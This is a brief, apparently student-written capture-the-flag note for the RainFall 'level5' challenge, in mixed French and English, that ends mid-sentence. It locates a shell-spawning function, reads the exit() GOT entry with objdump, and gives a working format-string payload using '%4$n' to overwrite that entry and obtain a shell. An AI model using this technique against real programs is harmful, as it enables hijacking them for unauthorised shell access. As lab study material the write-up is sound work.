address de la function o that have the call to: /bin/sh-> 0x080484a4  :o()

we have exit function at the end of n() ; with adrress: 

```bash
    objdmp -R ./level5
    08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0
```

level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")' > /tmp/out && (cat /tmp/out; cat) | ./level5 


in decimale of 0x080484a4 is : 134513828
so we will arse the 
